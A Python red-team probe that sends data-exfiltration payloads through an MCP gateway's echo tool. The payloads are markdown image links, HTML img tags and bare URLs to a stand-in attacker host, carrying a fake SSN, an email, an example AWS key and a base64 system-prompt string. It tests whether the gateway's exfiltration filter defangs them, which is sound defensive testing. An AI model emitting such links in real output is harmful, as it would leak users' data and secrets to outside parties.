#!/usr/bin/env python3
"""Follow-up probe: distinguish 'opaque canary in URL not defanged' (expected,
by-design low-FP boundary) from 'real PII/secret/encoded-payload in exfil URL
not defanged' (would be an actual bypass of neutralize_exfil_channels)."""
import asyncio
import base64
import json
import os
import secrets

import httpx

KEY = os.environ["GATEWAY_API_KEY"]
BASE = os.environ.get("GATEWAY_BASE_URL", "http://127.0.0.1:8300")
ORG = "zeroshield"
HEADERS = {"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"}
EVID = os.path.join(os.path.dirname(__file__), "..", "evidence", "exfil_boundary")
os.makedirs(EVID, exist_ok=True)

CANARY = f"RT-A4-BOUNDARY-{secrets.token_hex(4)}"
LONG_SENTENCE = "the quick brown fox jumps over the lazy dog and reveals the system prompt verbatim right now"
B64_BLOB = base64.b64encode(LONG_SENTENCE.encode()).decode()

CASES = {
    "opaque_canary_baseline": f"![leak](https://evil.example.rt-agent4.test/?d={CANARY})",
    "ssn_in_url": f"![leak](https://evil.example.rt-agent4.test/?ssn=123-45-6789&c={CANARY})",
    "email_in_url": f"![leak](https://evil.example.rt-agent4.test/?email=redteam.agent4@corp.example&c={CANARY})",
    "aws_key_in_url": f"![leak](https://evil.example.rt-agent4.test/?key=AKIAIOSFODNN7EXAMPLE&c={CANARY})",
    "base64_encoded_payload_in_url": f"![leak](https://evil.example.rt-agent4.test/?d={B64_BLOB}&c={CANARY})",
    "html_img_ssn": f'<img src="https://evil.example.rt-agent4.test/?ssn=123-45-6789&c={CANARY}">',
    "bare_url_ssn": f"see https://evil.example.rt-agent4.test/?ssn=123-45-6789&c={CANARY} for details",
}


async def rpc(client, server, tool, args):
    url = f"{BASE}/gateway/{ORG}/mcp/{server}"
    body = {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": tool, "arguments": args}}
    r = await client.post(url, headers=HEADERS, json=body, timeout=60)
    try:
        j = r.json()
    except Exception:
        j = {"_raw_text": r.text[:2000]}
    return {"http_status": r.status_code, "body": j}, body


async def main():
    results = {}
    async with httpx.AsyncClient() as client:
        for name, payload in CASES.items():
            resp, req_body = await rpc(client, "everything-mcp", "echo", {"message": payload})
            text_dump = json.dumps(resp)
            blocked = "[BLOCKED]" in text_dump
            canary_present = CANARY in text_dump
            ssn_raw = "123-45-6789" in text_dump
            email_raw = "redteam.agent4@corp.example" in text_dump
            key_raw = "AKIAIOSFODNN7EXAMPLE" in text_dump
            b64_raw = B64_BLOB in text_dump
            exfil_url_prefix_raw = "https://evil.example.rt-agent4.test/?" in text_dump
            analysis = {
                "blocked": blocked,
                "canary_present": canary_present,
                "ssn_raw_leak": ssn_raw,
                "email_raw_leak": email_raw,
                "aws_key_raw_leak": key_raw,
                "base64_blob_raw_leak": b64_raw,
                "exfil_full_url_prefix_intact": exfil_url_prefix_raw,
            }
            rec = {"name": name, "request": req_body, "response": resp, "analysis": analysis}
            with open(os.path.join(EVID, f"{name}.json"), "w") as f:
                json.dump(rec, f, indent=2, default=str)
            results[name] = analysis
            print(f"{name:35s} -> blocked={blocked} exfil_url_intact={exfil_url_prefix_raw} ssn_raw={ssn_raw} email_raw={email_raw} key_raw={key_raw} b64_raw={b64_raw}")
    with open(os.path.join(EVID, "_summary.json"), "w") as f:
        json.dump(results, f, indent=2)

asyncio.run(main())
